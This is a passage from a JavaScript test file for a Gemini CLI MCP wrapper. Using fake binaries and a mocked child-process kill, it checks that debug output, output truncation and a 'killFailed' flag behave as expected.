    await withEnv({ GEMINI_CLI_BIN: fake, GEMINICLI_MCP_MAX_OUTPUT_BYTES: "64", GEMINICLI_MCP_DEBUG: "1" }, async () => {
      const r = await invokeGemini({ prompt: "hi" });
      // The child should have been killed (truncated).
      assert.equal(r.truncated, true);
      assert.notEqual(r.exitCode, 0);
    });

    const allStderr = capturedStderr.join("");
    const debugLines = allStderr.split("\n").filter(l => l.startsWith("geminicli-mcp:debug "));
    const completeLine = debugLines.find(l => l.includes('"invoke complete"'));
    assert.ok(completeLine, "missing 'invoke complete' debug line");
    const completeData = JSON.parse(completeLine.replace("geminicli-mcp:debug ", ""));
    // The killFailed field should be present (boolean, even if false in this case).
    assert.ok("killFailed" in completeData, `killFailed field should be present in debug output, got keys: ${Object.keys(completeData).join(", ")}`);
    assert.equal(typeof completeData.killFailed, "boolean");
    // Also verify truncated/aborted are present.
    assert.equal(completeData.truncated, true);
  } finally {
    process.stderr.write = origWrite;
    try { fs.unlinkSync(fake); } catch {}
  }
});

test("npm test passes without GEMINICLI_MCP_DEBUG set (VAL-REM-F19-003)", async () => {
  // Verify that a normal invocation (debug unset) produces no debug output.
  const fake = makeFakeBin(`printf '{"response":"no-debug"}'`);

  const origWrite = process.stderr.write.bind(process.stderr);
  const capturedStderr = [];
  process.stderr.write = function (chunk, ...args) {
    capturedStderr.push(typeof chunk === "string" ? chunk : chunk.toString());
    return origWrite(chunk, ...args);
  };

  try {
    await withEnv({ GEMINI_CLI_BIN: fake, GEMINICLI_MCP_DEBUG: undefined }, async () => {
      const r = await invokeGemini({ prompt: "hi" });
      assert.equal(r.exitCode, 0);
      assert.equal(r.text, "no-debug");
    });

    const allStderr = capturedStderr.join("");
    assert.ok(!allStderr.includes("geminicli-mcp:debug"), `no debug output expected when GEMINICLI_MCP_DEBUG is unset, got: ${allStderr.slice(0, 200)}`);
  } finally {
    process.stderr.write = origWrite;
    try { fs.unlinkSync(fake); } catch {}
  }
});

test("killFailed is true when child.kill throws (VAL-FOLLOWUP-DOCS-CI-003)", { timeout: 7000 }, async () => {
  // Deterministically exercise the killFailed: true branch by overriding
  // ChildProcess.prototype.kill to throw, then triggering truncation which
  // calls killWith → child.kill("SIGTERM") → catch → killFailed = true.
  // The fake bin emits enough output to exceed the cap, then exits on its own
  // after 1s so the test cannot hang if the overridden kill prevents SIGTERM.
  const fake = makeFakeBin(
    "printf 'yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy'; sleep 1; exit 143"
  );

  const origKill = ChildProcess.prototype.kill;
  ChildProcess.prototype.kill = function killOverride() {
    throw new Error("mock kill failure for test");
  };

  const origWrite = process.stderr.write.bind(process.stderr);
  const capturedStderr = [];
  process.stderr.write = function (chunk, ...args) {
    capturedStderr.push(typeof chunk === "string" ? chunk : chunk.toString());
    return origWrite(chunk, ...args);
  };

  try {
    await withEnv(
      { GEMINI_CLI_BIN: fake, GEMINICLI_MCP_MAX_OUTPUT_BYTES: "64", GEMINICLI_MCP_DEBUG: "1" },
      async () => {
        const r = await invokeGemini({ prompt: "hi" });
        // The child should have been truncated (output exceeded cap).
        assert.equal(r.truncated, true);
        assert.notEqual(r.exitCode, 0);
      }
    );

    const allStderr = capturedStderr.join("");
    const debugLines = allStderr
      .split("\n")
      .filter((l) => l.startsWith("geminicli-mcp:debug "));

    // Verify the "invoke complete" debug line shows killFailed: true.
    const completeLine = debugLines.find((l) => l.includes('"invoke complete"'));
    assert.ok(completeLine, "missing 'invoke complete' debug line");
    const completeData = JSON.parse(
      completeLine.replace("geminicli-mcp:debug ", "")
    );
    assert.equal(
      completeData.killFailed,
      true,
      `expected killFailed to be true, got: ${JSON.stringify(completeData)}`
    );

    // Also verify the SIGTERM kill failed debug log was emitted.
    const killFailedLine = debugLines.find((l) =>
      l.includes('"SIGTERM kill failed"')
    );
    assert.ok(
      killFailedLine,
      "expected 'SIGTERM kill failed' debug line to be emitted"
    );
  } finally {
    ChildProcess.prototype.kill = origKill;
    process.stderr.write = origWrite;
    try {
      fs.unlinkSync(fake);
    } catch {}
  }
});
